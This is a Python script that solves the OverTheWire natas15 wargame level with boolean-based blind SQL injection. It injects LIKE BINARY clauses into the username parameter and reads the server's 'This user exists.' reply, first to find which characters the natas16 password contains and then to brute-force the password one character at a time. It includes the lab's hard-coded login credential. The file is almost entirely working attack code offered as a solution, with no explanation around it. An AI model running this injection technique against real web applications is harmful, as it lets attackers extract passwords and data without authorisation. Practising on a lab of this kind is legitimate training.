import requests, string

url = "http://natas15.natas.labs.overthewire.org"
auth_username = "natas15"
auth_password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

characters = ''.join([string.ascii_letters, string.digits])

password_dict = []
exists_str = "This user exists."
for char in characters:
    uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"%',char,'%','&debug'])
    r = requests.get(uri, auth=(auth_username,auth_password))
    if exists_str in r.text:
        password_dict.append(char)
        print("Password Dict: {}".format(''.join(password_dict)))
print("Dictionary build complete")
print("Dictionary: {}".format(''.join(password_dict)))
print("Now attempting to brute force")

password_list = []
password = ''

for i in range (1,32):
    for char in characters:
        test = ''.join([password, char])
        uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"',test,'%','&debug'])
        r = requests.get(uri, auth=(auth_username, auth_password))
        if exists_str in r.text:
            password_list.append(char)
            password = ''.join(password_list)
            print("Length: {}, Password: {}".format(len(password), password))
            
print("password has been found")
